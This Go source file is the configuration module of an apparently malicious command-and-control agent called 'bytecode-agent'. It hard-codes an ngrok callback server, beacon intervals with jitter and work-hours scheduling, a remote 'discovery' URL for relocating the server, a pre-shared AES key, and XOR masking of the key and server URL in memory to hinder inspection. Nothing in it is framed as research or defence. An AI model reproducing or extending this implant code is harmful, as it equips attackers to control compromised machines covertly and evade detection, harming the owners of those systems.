package config

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"bytecode-agent/internal/windows"
)

// DefaultServerURL can be overridden at build time using:
// -ldflags="-X 'bytecode-agent/internal/config.DefaultServerURL=http://your-ip:3001'"
var DefaultServerURL = "https://thu-nonspurious-deloris.ngrok-free.dev"


// DebugMode can be set to "true" at build time to show the console and enable verbose logging
var DebugMode = "false"

// Config holds the agent configuration
type Config struct {
	ServerURL     string
	DiscoveryURL  string // Optional URL to fetch the actual ServerURL from
	BeaconMin     int    // Minimum beacon interval in seconds
	BeaconMax     int    // Maximum beacon interval in seconds (jitter)
	IdentityFile  string
	IsDebug       bool
	EncryptionKey []byte
	Jitter        int // Jitter percentage (0-100)
	WorkHours     WorkHours
}

type WorkHours struct {
	Enabled bool
	Start   int // 0-23
	End     int // 0-23
}

// DefaultBeaconMin can be overridden at build time
var DefaultBeaconMin = "30"

// DefaultBeaconMax can be overridden at build time
var DefaultBeaconMax = "60"

// DefaultEncryptionKey is the PSK for AES traffic encryption (must be 32 bytes)
var DefaultEncryptionKey = "bytecode-c2-project-secret-key!!"


// Load returns the agent configuration from environment or defaults
func Load() *Config {
	discoveryURL := os.Getenv("BYTECODE_DISCOVERY")
	serverURL := os.Getenv("BYTECODE_SERVER")

	if serverURL == "" {
		serverURL = DefaultServerURL
	}

	identityFile := os.Getenv("BYTECODE_IDENTITY")
	if identityFile == "" {
		identityFile = ".bytecode_id"
	}

	// Simple conversion from string to int for build-time flags
	var min, max int
	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
	fmt.Sscanf(DefaultBeaconMax, "%d", &max)

	cfg := &Config{
		ServerURL:     serverURL,
		DiscoveryURL:  discoveryURL,
		BeaconMin:     min,
		BeaconMax:     max,
		IdentityFile:  identityFile,
		IsDebug:       DebugMode == "true",
		EncryptionKey: []byte(DefaultEncryptionKey),
		Jitter:        25, // Default 25% jitter
		WorkHours: WorkHours{
			Enabled: false,
		},
	}

	// If discovery URL is provided, try to update ServerURL
	if cfg.DiscoveryURL != "" {
		discovered, err := FetchDiscoveryURL(cfg.DiscoveryURL)
		if err == nil && discovered != "" {
			cfg.ServerURL = discovered
		}
	}

	return cfg
}

// FetchDiscoveryURL retrieves the server URL from a stable remote source
func FetchDiscoveryURL(url string) (string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("discovery server returned %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	discovered := strings.TrimSpace(string(body))
	if !strings.HasPrefix(discovered, "http") {
		return "", fmt.Errorf("invalid URL discovered: %s", discovered)
	}

	return discovered, nil
}

// Mask encrypts sensitive fields in the configuration
func (c *Config) Mask() {
	// XOR key for masking (can be randomized in later phases)
	key := byte(0x42)
	
	// Mask Encryption Key
	windows.MaskMemory(c.EncryptionKey, key)
	
	// Mask URLs (requires converting to byte slices)
	urlBytes := []byte(c.ServerURL)
	windows.MaskMemory(urlBytes, key)
	c.ServerURL = string(urlBytes)
}

// Unmask restores sensitive fields in the configuration
func (c *Config) Unmask() {
	key := byte(0x42)
	
	// Unmasking is the same as masking (XOR)
	windows.MaskMemory(c.EncryptionKey, key)
	
	urlBytes := []byte(c.ServerURL)
	windows.MaskMemory(urlBytes, key)
	c.ServerURL = string(urlBytes)
}
